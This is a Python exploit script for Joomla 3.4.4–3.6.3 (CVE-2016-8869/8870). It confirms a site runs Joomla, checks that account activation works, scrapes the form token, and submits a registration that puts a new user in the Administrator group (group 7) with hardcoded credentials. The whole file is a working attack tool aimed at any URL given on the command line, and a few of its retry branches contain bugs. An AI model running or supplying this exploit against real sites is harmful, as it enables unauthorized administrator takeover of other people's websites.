# Joomla 3.4.4 - 3.6.3 Account Creation/Privileges Escalation Exploit (CVE-2016-8869 / CVE-2016-8870)
# https://developer.joomla.org/security-centre/659-20161001-core-account-creation.html
# https://developer.joomla.org/security-centre/660-20161002-core-elevated-privileges.html

# a smart exploit that takes all the chances there to exploit joomla CVE-2016-8869 / CVE-2016-8870 vulnerabilities.

from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests_toolbelt.multipart.encoder import MultipartEncoder
import webbrowser
import requests
import os.path
import sys
import os
import re

urlPattern = 0
tokenSrc = 0
tokenSrcChanged = False
urlPatternChanged = False
regCheckFlag = False
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.session()
session.headers.update({"User-Agent":"Mozilla/5.0"})

# create def main():
def main():
	if len(sys.argv) <= 1:
		print "specifiy the target: exploit.py https://site.com"
		sys.exit()
	site = sys.argv[1]
	if not site.startswith('http'):
		site = 'http://%s' % site
	isJoomla(site)
	regenabled(site)
	register(site)

# create def isJoomla(site):
def isJoomla(site):
	print "checking if website is joomla-based"
	r = session.get(site + "/robots.txt", verify=False, allow_redirects=False)
	if r.status_code != 200:
		print "website doesn't seem joomla-based"
		sys.exit()
	if r.status_code == 200:
		needles = ("Disallow: /components/", "Disallow: /administrator/", "Disallow: /plugins/", "joomla")
		c = 0
		for n in needles:
			if n in r.text:
				c += 1
		if c == 4:
			print '99% website is based on joomla'
			return True
		print "website doesn't seem joomla-based"
		sys.exit()

# create def regenabled(site, ptrn1 = True):
def regenabled(site, ptrn1 = True):
	 cr1 = '/index.php/component/users/?task=registration.activate&token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
	 cr2 = '/component/users/?task=registration.activate&token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
	 print "testing if activation process works.."
	 r = session.get(site + (cr1 if ptrn1 else cr2), verify=False)
	 if (r.status_code == 404):
	 	global regCheckFlag
	 	if (regCheckFlag == True):
	 		print 'site appears to be broken or not even a joomla website'
	 		sys.exit()
	 	print 'got 404; testing the other url pattern'
	 	regCheckFlag = True
	 	regenabled(False)
	 if r.status_code == 403:
	 	print 'registration/activation is disabled; even if we trigger the exploit\nthe created account cannot be activated later which is useless'
	 	sys.exit()
# create def token(site):
def token(site):
	vl1 = '/index.php?option=com_users&view=login'
	vl2 = '/component/users/?view=login'
	vr1 = '/index.php?option=com_users&view=registration'
	vr2 = '/component/users/?view=registration'
	global urlPattern
	trl =  (vl1 if urlPattern == 0 else vl2) if tokenSrc == 0 else (vr1 if urlPattern == 0 else vr2)
	r = session.get(site + trl, verify=False)
	print 'getting token from:\n' + site + trl
	if (site + trl) != r.url:
		print "redirected to:\n" + r.url
	tokpattern = r"([a-fA-F\d]{32})"
	if len(re.findall(tokpattern, r.text)) > 1:
		print 'changing token regex pattern because we found more than 1 match'
		tokpattern = r'name="(.+?)"\svalue="1"'
	tok = re.search(tokpattern, r.text)
	if tok is None or len(tok.groups()[0]) != 32:
		global urlPatternChanged
		if urlPatternChanged == False:
			urlPattern = 1 if urlPattern == 0 else 1
			urlPatternChanged = True
			print 'could not find token.. changing url pattern..'
			register(site)
		else:
			print "could not find token.."
			sys.exit()
	print "token is " + tok.groups()[0]
	return tok.groups()[0]

def register(site):
	m = MultipartEncoder(
		fields={
				'user[groups][]': '7',
				'user[name]': 'user1', 
				'user[username]': 'user1',
				'user[password1]': 'azerty1234',
				'user[password2]': 'azerty1234',
				'user[email1]': 'something@example.com',
				'user[email2]': 'something@example.com',
				'option': 'com_users',
				'task': 'user.register',
				token(site): '1'
			   }
		)
	pl1 = '/index.php?option=com_users&task=user.register'
	pl2 = '/component/users/?task=user.register'
	url = site + (pl1 if urlPattern == 0 else pl2)
	global session
	r = session.post(url, data=m, headers={'Content-Type': m.content_type}, verify=False)
	print 'posting multipart data to:\n' + url
	invmsgs = ("Invalid Token", "Niepoprawny token", "Ongeldig teken", "invalid security token")
	for imsg in invmsgs:
		if imsg in r.text:
			global tokenSrcChanged
			if tokenSrcChanged == True:
				print "joomla is refusing token from both 'login' and 'registration' forms"
				sys.exit()
			print "joomla is refusing token.. getting token from another url"
			global tokenSrc
			tokenSrc = 0 if tokenSrc == 1 else 1
			tokenSrcChanged = True
			session = requests.session()
			print 'session refreshed'
			register()
	t = open("output.html", "w")
	t.write(r.text.encode('utf-8'))
	t.close()
	if r.url != url:
		print "redirected to:\n" + r.url
	if r.text == '':
		print "response is empty; something is broken within the website"
	else:
		print 'finished now you can check the raw response "output.html" and your email\nfor confirmation link to make sure whether successfully exploited (cause im too lazy)'
	#print(format('\n'.join('{}: {}'.format(k, v) for k, v in r.headers.items())))

main() # exit()
